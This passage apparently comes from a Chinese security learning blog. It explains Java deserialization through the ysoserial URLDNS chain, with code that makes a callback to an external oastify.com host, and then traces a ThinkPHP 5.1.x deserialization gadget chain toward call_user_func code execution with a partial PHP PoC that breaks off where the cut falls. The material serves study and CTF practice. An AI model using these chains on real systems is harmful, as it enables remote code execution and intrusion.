Unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Useri obj)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialized:&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Useri</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Useri</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>transient</strong></p><p>transient 标识的对象成员变量不参与序列化</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>可以看见反序列化后, 会自动调用readObject()方法(在php中则是__wakeup这样的方法), 而如果程序对readObject()进行了重写, 并添加了一些危险操作, 就会在反序列化后自动进行这些个危险操作, </p><h3 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h3><blockquote><p>入口类一般是<code>Map,Hashmap,HashTable</code>这些集合类，因为集合类型宽泛（泛型），因此肯定继承了<code>Serializeable</code>接口，在<code>Hashmap</code>类中也重写了<code>readObject</code>方法</p></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309195913040.png" alt="image-20240309195913040"></p><p>为什么重写?</p><blockquote><p>HashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。<br>Hash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key&#x3D;’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p>以ysoserial中的URLDNS作为一个例子</p><p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p><p>上面已经看见了hashMap对readObject的重写, 重点关注以下内容, 在readObject的最后, 调用的putVal</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309201854085.png" alt="image-20240309201854085"></p><p>首先跟进hash函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309202142278.png" alt="image-20240309202142278"></p><p>这里调用了key.hashCode(), 而Object key是可控的, 因此就可以调用可控类下的hashCode()方法</p><p>现在转向URL类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309203605526.png" alt="image-20240309203605526"></p><p>我们发现URL类下也有一个hashCode方法, 因此如果我们将可控类传入为一个URL对象, 这里的hashCode就会被调用</p><p>但是这里存在一个hashCode值的判断, 当其不为-1时直接返回hashCode</p><p>好在其默认值为-1, 也就是说这里会转到hashCode &#x3D; handler.hashCode(this);</p><p>继续跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309204051582.png" alt="image-20240309204051582"></p><p>观察第367行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure><p>这是一个获取主机地址的函数</p><p>因此, 如果我们传入一个vps的url地址, 这里就会触发一次对我们vps地址的解析, </p><p>倘若vps收到这个解析, 就能够证明反序列化漏洞的存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashmap.put(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>), <span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> unserialize();</span><br><span class="line">        System.out.println(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有趣的是这里序列化时也会发起一个dns请求</p><p>调试看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213620334.png" alt="image-20240309213620334"></p><p>跟进put方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240309213725383.png" alt="image-20240309213725383"></p><p>下一步直接调用了putVal 且key就是我们要解析的URL</p><p>所以, 在序列化时也会发起一次dns解析</p><p>再调试反序列化, 也会执行到这里</p><p>因此就无法判断哪一个请求是来自反序列化</p><p>此时就要引入上面提到的反射</p><p>通过反射, 在put时将hashCode的值设置为-1, 从而不执行后面的一系列方法, 在此之后, 又将hashCode设置为其他数字, 使其在反序列化时又能够触发dns请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap=  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcode</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url, <span class="number">123</span>); <span class="comment">// 修改url中的hashcode为非-1</span></span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashcode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//hashmap.put(new URL(&quot;http://t0umcddst9nwg1a9c7tk7xcdc4iv6mub.oastify.com&quot;), 1);</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">       <span class="comment">// Object obj = unserialize();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;obj&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;seria.bin&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时,序列化时就不会产出dns请求, 而反序列化时会发起dns</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java基础语法&quot;&gt;&lt;a href=&quot;#Java基础语法&quot; class=&quot;headerlink&quot; title=&quot;Java基础语法&quot;&gt;&lt;/a&gt;Java基础语法&lt;/h1&gt;&lt;h2 id=&quot;SOUT和SOUF输出&quot;&gt;&lt;a href=&quot;#SOUT和SOUF输出&quot; class</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5.1.x反序列化</title>
    <link href="http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2024/03/04/ThinkPHP-5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-03-04T14:28:24.000Z</published>
    <updated>2024-03-06T09:23:39.418Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x反序列化"><a href="#ThinkPHP-5-1-x反序列化" class="headerlink" title="ThinkPHP 5.1.x反序列化"></a>ThinkPHP 5.1.x反序列化</h1><p>我们已经学习了php反序列化的基础操作,但这远远不够</p><p> 前不久在比赛中遇到过几次thinkPHP反序列化的题目, 让人摸不着头脑, 最近又在大佬博客中无意间刷到了这部分内容, 在这里进行学习</p><p>参考: <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h2><ol><li>php7.2.34nts(phpstudy)</li><li>thinkPHP5.1.34</li></ol><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>首先就是tp5.1.34的安装, 几次从网上下载都不成功,最终方法是:</p><p>在phpstudy的composer2.5.8</p><p>在终端打开composer2.5.8的目录输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5_1_37</span><br></pre></td></tr></table></figure><p>下载后进入tp的目录</p><p>把”topthink&#x2F;framework”: “5.1.*”改成”topthink&#x2F;framework”: “5.1.37”</p><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><p><strong>首先跟一遍如何找链子</strong></p><p>由之前所学的知识可以找到, php反序列化最常见的入口就是<code>__destruct()</code>和<code>__wakeup()</code>其中最常见的就属<code>__destruct()</code></p><p>这里也正是利用<code>__destruct()</code>作为入口</p><p>首先seay全局查找<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304224653354.png" alt="image-20240304224653354"></p><p>我们要使用的就是<strong>think\process\pipes\Windows</strong> 类的 <strong>__destruct</strong> </p><p>其目录位置: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225102324.png" alt="image-20240304225102324"></p><p>跟进removeFiles()这个函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225229060.png" alt="image-20240304225229060"></p><p>这里调用了一个**file_exists($filename)**函数, 有趣的是这里的文件名 <strong>$filename</strong> 变量是可控。如果我们将一个类赋值给 <strong>$filename</strong> 变量，那么在 <strong>file_exists($filename)</strong> 的时候，就会触发这个类的 <strong>__toString</strong> 方法。</p><p>全局搜索**__toString()**方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225657758.png" alt="image-20240304225657758"></p><p>这里选用<strong>think&#x2F;concern&#x2F;Conversion</strong>类</p><p>目录路径: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304230129898.png" alt="image-20240304230129898"></p><p>跟进**toJson()**方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231418906.png" alt="image-20240304231418906"></p><p>继续跟进<strong>toArray()</strong></p><p>在<strong>toArray</strong>中**$relation<strong>可控, 并且赋值后调用</strong>$relation<strong>下的</strong>visible()**</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231547711.png" alt="image-20240304231547711"></p><p>跟进<strong>getAttr()方法</strong>看看$relation到底从何而来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231259379.png" alt="image-20240304231259379"></p><p>跟进<strong>getData()</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305001517580.png" alt="image-20240305001517580"></p><p>$this-&gt;data[$name]可控</p><p>这里附一张大佬的图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/4.png"></p><p>依照大佬的思路, 这里没有可利用的visible方法, 需要一个**_call()<strong>来被这个</strong>$relation-&gt;visible($name);**触发</p><p>依旧是全局搜索, 在<strong>think&#x2F;request</strong>类中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002602378.png" alt="image-20240305002602378"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002656453.png" alt="image-20240305002656453"></p><p>这里 <strong>call_user_func_array</strong> 函数的第一个参数完全可控, 因此我们可以调用<strong>call_user_func_array(array(任意类,任意方法),$args)</strong>, </p><p>虽然第330行用 <strong>array_unshift</strong> 函数把本类对象 <strong>$this</strong> 放在数组变量 <strong>$args</strong> 的第一个，但是我们可以寻找不受这个参数影响的方法。</p><blockquote><p>分析过 <strong>ThinkPHP</strong> 历史 <strong>RCE</strong> 漏洞的人可能知道， <strong>think\Request</strong> 类的 <strong>input</strong> 方法经常是链中一个非常棒的 <strong>Gadget</strong> ，相当于 <strong>call_user_func($filter,$data)</strong> 。但是前面我们说过， <strong>$args</strong> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 <strong>input</strong> 方法，而应该寻找调用 <strong>input</strong> 的方法。</p></blockquote><p>先来看看<strong>input()<strong>方法, 这里直接可以执行一个</strong>call_user_func($filter,$data)</strong></p><p>对应参数 $default 和 $filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131417663.png" alt="image-20240305131417663"></p><p>回调$this-&gt;filterValue()方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131601772.png" alt="image-20240305131601772"></p><p>我们需要控制的就是input的第一个参数$data和最后一个参数$filter</p><p>由于上面也提到了**__call()** 下的<strong>call_user_func_array(array(任意类,任意方法),$args)<strong>中</strong>$args</strong>是不可控的($args的第一个值被强制定义), 所以这里无法直接调用<strong>input()</strong>,因为我们不能控制其参数</p><p>所以应该转而查找哪里调用了<strong>input()</strong>,以此来间接调用避免掉**$args**的影响</p><p>这里不选用request</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305132947432.png" alt="image-20240305132947432"></p><p>找到当前类的param方法, 第961行调用了input, 且 第一个参数完全可控,  但$filter不可控, 因此, 又需要寻找哪里调用了param方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135640187.png" alt="image-20240305135640187"></p><p>可以看见, 当前类下的isAjax和isPjax两个方法都调用了param方法, 且参数完全可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135916160.png" alt="image-20240305135916160"></p><p>至此, 链子就有了</p><p>首先, 在windows.php下</p><p><strong>__destruct()</strong> –&gt; <strong>removeFiles()</strong>  –&gt;  <strong>__toString()</strong> –&gt;  </p><p>在Conversion.php下</p><p>–&gt; <strong>__toString()</strong>  –&gt; <strong>toJson()</strong>  –&gt;  <strong>toArray()</strong> –&gt; </p><p>在request.php下</p><p>–&gt; <strong>__call()</strong> –&gt;  <strong>isAjax()</strong>  –&gt; <strong>param()</strong>  –&gt; <strong>input()</strong>   –&gt; <strong>filterValue()</strong>  –&gt;  <strong>call_user_func()</strong></p><p>贴一张大佬的图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/10.png"></p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>上面已经找出来了一条链子, 但是具体细节并没有关注</p><p>前面的**__destruct**的触发不必多说, 但是 **__toString()**的触发就出现了第一个坑</p><p>我们在Conversion类的定义处可以发现, Conversion类是被trait修饰的, 因此, 它并不能被实例化, 但是trait修饰的类可以被其他类use,达到类似继承的效果</p><p>查找一下use了Conversion的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102313714.png" alt="image-20240306102313714"></p><p>这里有一个Model类, 跟进看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102413394.png" alt="image-20240306102413394"></p><p>Model虽然use了Conversion, 但它又被abstract修饰, 因此也不可以实例化, 但我们可以再查找继承Model的类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102637593.png" alt="image-20240306102637593"></p><p>不难发现有一个Pivot类是继承了Model类的,</p><p>因此, Pivot通过继承use了Conversion类的Model类,间接存在一个toString方法</p><p>因此, 触发链的开头就是</p><p>Windows-&gt;__destruct()   ——————-&gt;&gt;&gt;&gt;     Pivot-&gt;toString()</p><p><strong>poc</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面的继承关系并不用关心, 与源码中相同即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];<span class="comment">//触发Pivot(Conversion)-&gt;__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此, 代码执行后就会跳转到Pivot 下的toString, 由于这个方法是继承的Conversion的, 自然会跳转到Conversion类中</p><p>需要注意的是这里Windows-&gt;files是一个数组, 这是由源码中定义的</p><p>跳转到toString后, 依次要进入的是toJson,  toArray, 中间的过程并没有传递我们可控的参数, 所以并不关心</p><p>toArray的代码段比较长, 都是遍历了几个this下的可控变量, 我们只关心以下这个遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;    <span class="comment">//$this-&gt;append数组下的一个值需要为数组</span></span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$this-&gt;append as $key =&gt; $name</span></span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span 